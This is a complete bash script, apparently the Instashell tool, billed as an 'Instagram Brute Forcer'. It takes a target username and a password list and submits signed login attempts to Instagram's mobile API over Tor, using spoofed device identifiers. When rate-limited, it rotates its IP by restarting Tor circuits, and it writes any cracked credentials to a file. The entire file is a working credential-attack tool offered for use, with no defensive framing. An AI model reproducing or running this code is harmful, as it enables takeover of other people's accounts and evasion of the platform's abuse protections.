#!/bin/bash
# Coded by @thelinuxchoice (Instagram)
checkroot() {
if [[ "$(id -u)" -ne 0 ]]; then
    printf "\e[1;77mPlease, run this program as root!\n\e[0m"
    exit 1
fi
}

banner() {

printf "\e[1;92m     _                                   _             _  _           \e[0m\n"
printf "\e[1;92m _  | |                _                | |           | || |          \e[0m\n"
printf "\e[1;92m( \ | | ____    ___  _| |_  _____   ___ | |__   _____ | || |          \e[0m\n"
printf "\e[1;92m ) )| ||  _ \  /___)(_   _)(____ | /___)|  _ \ | ___ || || |          \e[0m\n"
printf "\e[1;77m(_/ | || | | ||___ |  | |_ / ___ ||___ || | | || ____|| || |  _____   \e[0m\n"
printf "\e[1;77m    |_||_| |_|(___/    \__)\_____|(___/ |_| |_||_____) \_)\_)(_____)  \e[0m\n"
printf "\n"
printf "\e[1;77m\e[45m                     Instagram Brute Forcer. Author: @thelinuxchoice\e[0m\n"
printf "\n"
}

banner
checkroot
read -p $'\e[1;92mUsername account: \e[0m' user
read -p $'\e[1;92mPassword List: \e[0m' wl_pass

checktor() {

check=$(curl --socks5 localhost:9050 -s https://check.torproject.org > /dev/null; echo $?)

if [[ "$check" -gt 0 ]]; then
printf "\e[1;91mPlease, start TOR!\n\e[0m"
exit 1
fi

}


function changeip() {

killall -HUP tor
sleep 3

}

string8=$(cat /dev/urandom | tr -dc 'az0-9' | fold -w 8 | head -n 1)
string4=$(cat /dev/urandom | tr -dc 'az0-9' | fold -w 4 | head -n 1)
string12=$(cat /dev/urandom | tr -dc 'az0-9' | fold -w 12 | head -n 1)
string16=$(cat /dev/urandom | tr -dc 'az0-9' | fold -w 16 | head -n 1)
device="android-$string16"
uuid=$(cat /dev/urandom | tr -dc 'az0-9' | fold -w 32 | head -n 1)
phone="$string8-$string4-$string4-$string4-$string12"
guid="$string8-$string4-$string4-$string4-$string12"
var=$(curl -i -s -H "$header" https://i.instagram.com/api/v1/si/fetch_headers/?challenge_type=signup&guid=$uuid > /dev/null)
var2=$(echo $var | awk -F ';' '{print $2}' | cut -d '=' -f3)
#echo $var2

function bruteforcer() {

checktor
for pass in $(cat $wl_pass); do

header='Connection: "close", "Accept": "*/*", "Content-type": "application/x-www-form-urlencoded; charset=UTF-8", "Cookie2": "$Version=1" "Accept-Language": "en-US", "User-Agent": "Instagram 10.26.0 Android (18/4.3; 320dpi; 720x1280; Xiaomi; HM 1SW; armani; qcom; en_US)"'

data='{"phone_id":"$phone", "_csrftoken":"$var2", "username":"'$user'", "guid":"$guid", "device_id":"$device", "password":"'$pass'", "login_attempt_count":"0"}'
ig_sig="4f8732eb9ba7d1c8e8897a75d6474d4eb3f5279137431b2aafb71fafe2abe178"


hmac=$(echo -n "$data" | openssl dgst -sha256 -hmac "${ig_sig}" | cut -d " " -f2)
printf "\e[1;77mTrying pass\e[0m: %s\n" $pass
check=$(curl --socks5 127.0.0.1:9050 -d "ig_sig_key_version=4&signed_body=$hmac.$data" -s --user-agent 'User-Agent: "Instagram 10.26.0 Android (18/4.3; 320dpi; 720x1280; Xiaomi; HM 1SW; armani; qcom; en_US)"' -w "\n%{http_code}\n" -H "$header" "https://i.instagram.com/api/v1/accounts/login/" | grep -o '200\|challenge\|many tries\|Please wait' | uniq)
#echo $check
if [[ "$check" == "200" ]]; then
printf "\e[1;92m [*] Password Found: %s \n\e[0m" $pass
printf "Username: %s, Password: %s\n" $user $pass >> found.instashell
printf "\e[1;92m [*] Saved:\e[0m\e[1;77m found.instashell \n\e[0m"
exit 1
fi

if [[ "$check" == "challenge" ]]; then
printf "\e[1;92m [*] Password Found: %s\n" $pass
printf "\e[1;92m [*] Challenge required\n"
printf "Username: %s, Password: %s\n" $user $pass >> found.instashell
printf "\e[1;92m [*] Saved:\e[0m\e[1;77m found.instashell \n\e[0m"
exit 1
fi


if [[ "$check" == "many tries" ]]; then

printf "\e[1;31m [*] Changing IP Address...\n\e[0m"
changeip 
fi
if [[ "$check" == "Please wait" ]]; then

printf "\e[1;31m [*] Changing IP Address...\n\e[0m"
changeip 
fi

done
}

bruteforcer

